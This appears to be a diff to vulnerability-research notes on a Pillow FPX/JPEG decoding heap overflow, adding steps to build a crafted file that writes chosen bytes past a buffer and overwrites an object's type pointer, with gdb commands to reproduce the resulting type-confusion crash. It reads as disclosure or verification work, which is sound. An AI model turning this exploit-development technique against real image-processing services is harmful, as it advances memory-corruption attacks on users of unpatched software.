@@ -12,6 +12,9 @@ Files:
   (`internal_color_conversion=1` -> `jpegmode=None`), and a 256-wide 4-component
   CMYK JPEG whose decoded bytes are chosen by its coefficients.
   Usage: `python3 make_case.py OUT.JPX JPEG_WIDTH FILL16 TILE_W TILE_H`.
+  Optional 6th arg: 512 hex chars = 256 desired raw decoded row bytes (the
+  encoder writes `0xff - desired`); optional 7th: JPEG height (default 8).
+  The uniform-fill invocation still regenerates `case64.fpx` byte-identically.
 - `case.fpx` — 16x16 tile, input fill `0x5a` (decodes `0xa5`).
 - `case5a.fpx` — 16x16 tile, input fill `0xa5` (decodes chosen `0x5a`).
 - `case64.fpx` — 64x64 tile, input fill `0xa5`; accepted by both 12.2.0 and
@@ -147,3 +150,52 @@ PYTHONPATH=/tmp/pw2-w2/v12plain gdb -q -batch \
   -ex 'printf "TYPE=%lx\n",*(unsigned long*)($b+184)' -ex 'x/4gx $b+176' \
   --args python3 -c 'from PIL import Image; Image.open("case64.fpx").load()'
 ```
+
+## W4 — distinct chosen bytes and chosen valid pointer (2026-11-21)
+
+New artifacts: `case_ptr64.fpx` (SHA-256
+`cf7787a35747ae88b65f22cf8187f8e7012812f9739cd7985d00365dd15c3bc6`),
+`pattern_full.hex` / `pattern2.hex`, `rawscan.c` (raw libjpeg scanline
+calibrator), `firstrow.gdb` / `firstrow.log`, `ptr_store.gdb` / `ptr_store.log`,
+`full_restore_clean.gdb` / `full64_restore_clean.log`,
+`full_restore_type.gdb` / `full64_restore_type.log`, `crash_disasm.log`,
+`run64_[1-5].log`, `plain_v13_pattern_control.log`.
+
+Regenerate the case (Pillow 12.2.0 must be on PYTHONPATH for JPEG encoding):
+
+```
+PYTHONPATH=/tmp/pw2-w2/v12plain python3 make_case.py case_ptr64.fpx 256 0xa5 64 64 \
+  "$(cat pattern_full.hex)" 64
+```
+
+`pattern_full.hex` puts chosen `0x11` at row offsets 128-135 and the
+little-endian valid address `0xa2d260` (`&PyCode_Type` in this plain build) at
+184-191, the `ob_type` of the live `PyUnicodeObject` at `buffer+176`.
+
+Catch the chosen-pointer store in the plain v12.2.0 build:
+
+```
+PYTHONPATH=/tmp/pw2-w2/v12plain gdb -q -batch -x ptr_store.gdb --args python3 -c \
+  'from PIL import Image; Image.open("case_ptr64.fpx").load()'
+```
+
+Expected: buffer `0xd32bb0`, `Old value = 192 '\300'`, `New value = 96 '`'` at
+`buffer+184` from `libjpeg.so.8`, stack through pinned `JpegDecode.c:252`.
+
+Causal differential on the same byte-identical file (both scripts snapshot the
+full 896-byte past-end span before the write and restore it after the decoder
+call):
+
+```
+PYTHONPATH=/tmp/pw2-w2/v12plain gdb -q -batch -x full_restore_clean.gdb --args python3 -c \
+  'from PIL import Image; Image.open("case_ptr64.fpx").load(); print("LOAD_OK")'
+PYTHONPATH=/tmp/pw2-w2/v12plain gdb -q -batch -x full_restore_type.gdb --args python3 -c \
+  'from PIL import Image; Image.open("case_ptr64.fpx").load(); print("LOAD_OK")'
+```
+
+First run exits normally after `LOAD_OK`; second re-applies only
+`ob_type=0xa2d260` and faults at `0x447239` in `Py_FinalizeEx()`. That is a
+type-confusion fault, not execution of chosen code: no marker, PC control or
+chosen-code call was observed. Plain non-gdb runs: 5/5 `LOAD_OK` then rc 134
+`corrupted size vs. prev_size`; plain fixed 13.0.0 raises `OSError`, rc 1.
+W3 (#926) and W4 are new author evidence awaiting witness replay.
